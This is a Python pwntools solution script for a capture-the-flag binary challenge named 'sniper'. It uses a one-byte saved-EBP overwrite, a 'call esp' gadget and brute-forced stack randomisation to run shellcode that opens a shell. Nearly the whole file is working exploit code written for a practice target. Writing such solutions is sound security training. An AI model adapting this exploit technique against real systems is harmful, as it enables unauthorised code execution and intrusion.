#!/usr/bin/env python2
# -*- coding: utf-8 -*-

# This solution works since the only bits 5-8 of the least significant byte of OLD_EBP is randomized
# Therefore, if one chooses to overwrite with a byte xxxxxxxx then in one out of 16, the same stack
# address will be encountered
#
# Choose some byte and observe at which offset from the array start address
# the ESP pointer will be when main is about to execute 'ret'.
# Add the shellcode just after the offset and place the address of an 'call esp' instruction at the offset
# I have chosen the arbitrary value 'e' 

from pwn import *

context(arch = "i386", os = "linux")

PROGRAM = './sniper'

RETURN_ADDRESS=0x080486db #call esp
RETURN_OFFSET=25
EBP_OFFSET=136

SHELLCODE = ""
while len(SHELLCODE) < RETURN_OFFSET:
	SHELLCODE += "a"
SHELLCODE += flat(RETURN_ADDRESS)
SHELLCODE += asm(shellcraft.sh())

while len(SHELLCODE) < EBP_OFFSET:
	SHELLCODE += "b"
SHELLCODE += "e"

assert len(SHELLCODE) == 137

#splash()
maxTries = 100
tries = 0
l = log.progress('Getting shell')
while tries < maxTries:
	p = None
	try:
		l.status('attempt number: %d' % tries)
		tries+=1
		with context.local(log_level='error'):
			p = process(PROGRAM)
			#p = remote("ctf2016.the-playground.dk", 12004)
			p.recvuntil(" of brute forcing!")
			p.send(SHELLCODE)
			p.sendline("echo 'foo'")
			p.recvuntil('foo')
			with context.local(log_level='info'):
				l.success("Got shell at attempt number: %d" % tries)
			p.interactive()
		exit(0)
	except EOFError:
		with context.local(log_level='error'):
			p.close()
l.failure("Did not get shell within %d tries" % maxTries)